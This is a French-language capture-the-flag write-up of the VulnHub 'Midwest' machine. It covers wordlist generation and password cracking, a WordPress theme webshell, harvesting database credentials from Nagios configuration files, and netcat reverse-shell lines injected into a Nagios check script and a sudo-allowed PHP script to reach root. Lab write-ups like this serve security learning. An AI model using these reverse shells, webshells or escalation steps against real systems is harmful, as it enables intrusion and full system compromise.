# Solution du CTF Midwest de VulnHub

[Midwest](https://vulnhub.com/entry/midwest-101,692/) est un CTF proposé sur VulnHub. Il a été mis en ligne en juin 2021 et à ce jour il semble que personne ne l'ai résolu jusqu'à présent.

Il faut dire que l'auteur mentionne qu'il faut *A bit of brute force* mais on est assez loin de la réalité (il faudrait compter au minimum deux heures).

Une fois cette étape passée il faut se battre avec un Nagios qui n'est pas facile à appréhender.

Une fois résolu on est tout de même satisfait de CTF donc merci à [@renmizo](https://twitter.com/renmizo) de l'avoir créé.

```
Nmap scan report for 192.168.56.105
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3162bbfc879a390196540318bb03bc90 (RSA)
|   256 4d2168a058a41827babd29baa791bc35 (ECDSA)
|_  256 77ce55b48793dc4c056e67903f78d064 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: WordPress 5.6
|_http-title: Midwest Power &#8211; Powering the future!
```

Le port 80 livre un *Wordpress* avec des liens pour `www.midwest.htb`. On ajoute aussitôt une entrée dans le `/etc/hosts` histoire que ça s'affiche correctement.

Le blog est quasi vide et ne délibre pas d'informations de grande importances. J'enchaine donc sur une énumération avec `Feroxbuster` :

```
301        9l       28w      323c http://www.midwest.htb/javascript
301        9l       28w      323c http://www.midwest.htb/wp-content
301        9l       28w      324c http://www.midwest.htb/wp-includes
301        9l       28w      321c http://www.midwest.htb/wp-admin
403        9l       28w      280c http://www.midwest.htb/server-status
200      276l     1469w        0c http://www.midwest.htb/
401       14l       54w      462c http://www.midwest.htb/nagios
```

## Po Po Po Po Po Power

Il y a ici un `Nagios` qui demande des identifiants. Je prend donc la recommandation de l'auteur à la lettre et commence à bruteforcer le Nagios.

Je tente avec les utilisateurs `nagios`, `nagiosadmin`, `admin` qui semblent assez officiels. J'arrête après un moment car j'estime que sur un CTF on ne devrait pas passer plus de 10 minutes à bruteforcer un utilisateur.

Je décide donc de passer à [GitHub - digininja/CeWL: CeWL is a Custom Word List Generator](https://github.com/digininja/CeWL) : un outil qui va générer une wordlist depuis les mots présents sur le *Wordpress*.

On peut le lancer via une image *Docker* qu'il faut d'abord `build` mais j'obtiens une erreur liée à la version de bundler. C'est résolu en modifiant le `Dockerfile` comme suivant :

```dockerfile
FROM ruby:2.5-alpine

ENV RUBYOPT "rubygems"

COPY Gemfile /usr/src/CeWl/
WORKDIR /usr/src/CeWl

RUN set -ex \
    && apk add  --no-cache --virtual .build-deps build-base \
    && gem install bundler -v 2.3.26 \
    && bundle install \
    && apk del .build-deps

COPY . /usr/src/CeWL

WORKDIR /host
ENTRYPOINT ["/usr/src/CeWL/cewl.rb"]
```

Je peux désormais `build` :

```bash
docker build -t cewl .
```

Puis lancer l'extraction :

```bash
docker run --add-host www.midwest.htb:192.168.56.105 -it --rm cewl http://www.midwest.htb/ > words.txt
```

On obtient une liste de mots assez basiques et en grande partie inutile (je ne m'étendrais pas sur mon opinion sur cet outil), libre à chacun de faire le tri derrière ou de coder quelque chose de mieux (à base de NLP, stopwords, etc).

A partir de cette liste on peut utiliser `John The Ripper` pour générer des permutations :

```bash
john --rules --wordlist=words.txt --stdout | sort | uniq > wordlist.txt
```

Il faut compter une demi heure pour casser le mot de passe de `nagiosadmin` (`PowerPower`).

Pour ce qui est du *Wordpress* on peut utiliser `wpscan` pour brute forcer le compte `admin` via `xmlrpc`. Là il faut bien compter 2 heures au bas mot.

J'ai préféré shunter cette étape car entre lancer un outil de bruteforce et attendre 5 minutes et lancer un outil de bruteforce et attendre 5 heures il n'y a aucune compétence supplémentaire requise.

J'ai donc accédé au disque de la VM pour extraire les hashs. Ceux du *Nagios* sont du sha1 mais encodé en base64, il faut les décoder et obtenir la version hexa :

```python
>>> from base64 import b64decode
>>> from binascii import hexlify
>>> hexlify(b64decode("CR5yxS528yxH6d4rAwgvtKyuAvM="))
b'091e72c52e76f32c47e9de2b03082fb4acae02f3'
>>> hexlify(b64decode("L21ZSH6P9HEpeFEW312EItg4fkY="))
b'2f6d59487e8ff47129785116df5d8422d8387e46'
```

Et pour le *Wordpress* il faut bien sûr extraire le hash `phpass` de la base.

```shellsession
$ john --wordlist=wordlist.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:11 38.35% (ETA: 14:03:45) 0g/s 11262p/s 11262c/s 11262C/s hayears..hcfamilies
Power9           (admin)     
1g 0:00:00:20 DONE (14:03) 0.04844g/s 11209p/s 11209c/s 11209C/s power87..power955
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Comptez 15 minutes pour casser le `phpass` tout de même !

Via le `Nagios` il semble qu'il n'y ait rien que l'on puisse faire directement pour obtenir une exécution de commande, on va donc utiliser le compte Wordpress et aller comme d'habitude éditer un script PHP via le `Theme Editor`.

Le thème `twentynineteen` est modifiable, on peut ajouter un webshell dans le `404.php` et obtenir notre RCE de cette façon :

`http://www.midwest.htb/wp-content/themes/twentynineteen/404.php?cmd=id`

Sur le système je peux lister les fichiers sur lesquels j'ai un accès en écriture et ils sont nombreux :

```bash
find / -type f -writable 2> /dev/null | grep -v /var/www | grep -v /proc
```

Grosso modo ça correspond aux fichiers dans les dossiers suivants :

```
/usr/local/nagios/
/usr/local/nagiosxi/
/var/lib/snmp/mibs/
/usr/local/nagvis/
```

## Usine à gaz

On a donc pas mal de contrôle sur le `Nagios`. Je ne connais ce software que de nom alors j'ai d'abord cherché ses fichiers de configurations. Par exemple dans le premier dossier il y a le fichier `/usr/local/nagios/etc/ndo.cfg` qui contient les identfiants suivants :

```ini
# Default NDO config for Nagios XI 

db_user=ndoutils
db_pass=n@gweb
db_name=nagios
db_host=localhost
db_port=3306
#db_socket=/var/lib/mysql.sock
db_max_reconnect_attempts=5
```

Ou dans le fichier `/usr/local/nagiosxi/html/config.inc.php` :

```php
// DB-specific connection information
$cfg['db_info'] = array(
    "nagiosxi" => array(
        "dbtype" => 'mysql',
        "dbserver" => '',
        "user" => 'nagiosxi',
        "pwd" => 'n@gweb',
        "db" => 'nagiosxi',
        "charset" => "utf8",
        "dbmaint" => array( // variables affecting maintenance of db
            "max_auditlog_age" => 180, // max time (in DAYS) to keep audit log entries
            "max_commands_age" => 480, // max time (minutes) to keep commands
            "max_events_age" => 480, // max time (minutes) to keep events
            "optimize_interval" => 60, // time (in minutes) between db optimization runs
            "repair_interval" => 0, // time (in minutes) between db repair runs
        ),
    ),
// --- snip ---
    "nagiosql" => array(
        "dbtype" => 'mysql',
        "dbserver" => 'localhost',
        "user" => 'nagiosql',
        "pwd" => 'n@gweb',
        "db" => 'nagiosql',
        "charset" => "utf8",
        "dbmaint" => array( // variables affecting maintenance of db
            "max_logbook_age" => 480, // max time (minutes) to keep log book records
            "optimize_interval" => 60, // time (in minutes) between db optimization runs
            "repair_interval" => 0, // time (in minutes) between db repair runs
        ),
    ),
```

Il n'y a rien d'intéressant dans la base `nagiosxi` mais les deux autres contiennent des données.

`Nagios` (dans cette version `4.4.6` en tout cas) n'est pas vraiment ergonomique mais dans la section `Configuration` de l'interface web on trouve différentes entités qui définissent quoi monitorer et de quelle façon.

Via la base de données j'ai compris qu'un moniteur est définit via un `Service` qui est basé sur une `Command` :

```sql
MariaDB [nagios]> select display_name, check_command_object_id, check_command_args from nagios_services where service_id=5;
+--------------+-------------------------+---------------------+
| display_name | check_command_object_id | check_command_args  |
+--------------+-------------------------+---------------------+
| PING         |                      50 | 100.0,20%!500.0,60% |
+--------------+-------------------------+---------------------+
1 row in set (0.001 sec)

MariaDB [nagios]> select * from nagios_commands where command_id=50;
+------------+-------------+-------------+-----------+--------------------------------------------------------------+
| command_id | instance_id | config_type | object_id | command_line                                                 |
+------------+-------------+-------------+-----------+--------------------------------------------------------------+
|         50 |           1 |           1 |        50 | $USER1$/check_ping -H $HOSTADDRESS$ -w $ARG1$ -c $ARG2$ -p 5 |
+------------+-------------+-------------+-----------+--------------------------------------------------------------+
1 row in set (0.001 sec)
```

Mon idée était de modifier l'entrée `command_line` pour obtenir une exécution de code mais les modifications n'ont eu aucun effet.

Le fait que le CGI ne soit pas linké à une librairie pour mysql m'a mis sur la bonne piste :

```shellsession
www-data@midwest:/usr/local/nagios$ file ./sbin/config.cgi
./sbin/config.cgi: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=266c583d1d0293fc51ac8afdbc7050e9bcb9f59f, stripped
www-data@midwest:/usr/local/nagios$ ldd ./sbin/config.cgi
        linux-vdso.so.1 (0x00007ffe5379f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fef0f44f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fef0f66b000)
```

La configuration de *Nagios* ici doit se reposer sur des fichiers et effectivement je retrouve la commande ping définie dans `/usr/local/nagios/etc/commands.cfg` :

```bash
define command {
    command_name    check_ping
    command_line    $USER1$/check_ping -H $HOSTADDRESS$ -w $ARG1$ -c $ARG2$ -p 5
}
```

Le programme mentionné se trouve à `/usr/local/nagios/libexec/check_ping` et il s'agit d'un binaire ELF.

J'ai essayé de modifier le fichier `cfg` mais il semble que la modification ne soit pas rechargée et je ne dispose pas de droits suffisants pour envoyer un signal au process `Nagios`.

Toutefois dans les services il y en a un nommé `Memory Usage` faisant appel à la `Command` `check_local_mem` qui correspond à l'entrée suivante :

```bash
define command {
    command_name    check_local_mem
    command_line    $USER1$/custom_check_mem -w $ARG1$ -c $ARG2$ -n
}
```

Il s'agit d'un script bash et on a bien un accès écriture :

```shellsession
www-data@midwest:/usr/local/nagios$ file libexec/custom_check_mem
libexec/custom_check_mem: Bourne-Again shell script, ASCII text executable
www-data@midwest:/usr/local/nagios$ ls -al libexec/custom_check_mem
-rwxrwxr-x 1 www-data nagios 3435 Jan 22  2021 libexec/custom_check_mem
```

Je le modifie pour ajouter la commande `nohup nc -e /bin/sh 192.168.56.1 7777&` et j'attend que mon shell vienne et que ma volonté soit faite (envoie sa soeur !) :

```bash
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.106.
Ncat: Connection from 192.168.56.106:51380.
id
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
cd /home/nagios
mkdir .ssh
cd .ssh
echo ssh-rsa AAAA--- snip ma clé publique SSH snip ---cT7R== > authorized_keys
exit
```

Je peux alors me connecter au SSH avec l'utilisateur `Nagios` et j'obtiens bien le premier flag :

```
nagios@midwest:~$ cat user.txt 
7ec306b6fa01510ffc4e0d0fac97c23e
```

## Root 66

Pour l'escalade de priviléges, le compte a un bon nombre de permissions sudo :

```shellsession
nagios@midwest:~$ sudo -l
Matching Defaults entries for nagios on midwest:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on midwest:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

On peut utiliser `awk` et `xargs` pour voir les permissions des exécutables mentionnés :

```shellsession
nagios@midwest:~$ sudo -l | grep NOPASSWD | awk '{ print $3 }' | sort | uniq | xargs ls -al
ls: cannot access '/etc/init.d/nagios': No such file or directory
-rwxr-xr-x 1 root root    2110 Jan 22  2021 /etc/init.d/npcd
lrwxrwxrwx 1 root root      21 Jan 22  2021 /usr/bin/php -> /etc/alternatives/php
-r-xr-x--- 1 root nagios  7714 Jan 22  2021 /usr/local/nagiosxi/scripts/backup_xi.sh
-r-xr-x--- 1 root nagios  1800 Jan 22  2021 /usr/local/nagiosxi/scripts/change_timezone.sh
-r-xr-x--- 1 root nagios 16332 Jan 22  2021 /usr/local/nagiosxi/scripts/components/getprofile.sh
-r-xr-x--- 1 root nagios  3809 Jan 22  2021 /usr/local/nagiosxi/scripts/manage_services.sh
-r-xr-x--- 1 root nagios  3820 Jan 22  2021 /usr/local/nagiosxi/scripts/manage_ssl_config.sh
-r-xr-x--- 1 root nagios  4894 Jan 22  2021 /usr/local/nagiosxi/scripts/reset_config_perms.sh
-r-xr-x--- 1 root nagios  2914 Jan 22  2021 /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
```

Aucun accès en écriture... mais qu'en est-il des scripts PHP exécutés par `/usr/bin/php` ?

```shellsession
nagios@midwest:~$ ls -al /usr/local/nagiosxi/scripts/send_to_nls.php
-rwxr-xr-x 1 nagios nagios 1534 Jan 22  2021 /usr/local/nagiosxi/scripts/send_to_nls.php
```

Bingo ! Je rajoute la ligne suivante :

```php
system("/usr/bin/nc -e /bin/bash 192.168.56.1 7777");
```

Et j'exécute :

```shellsession
nagios@midwest:/usr/local/nagios/libexec$ sudo /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php yop
```

Cette fois le shell est root, mission accomplie !

```shellsession
$ ncat -l  -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.105.
Ncat: Connection from 192.168.56.105:47878.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
0d599f0ec05c3bda8c3b8a68c32a1b47
```

*Publié le 16 février 2023*
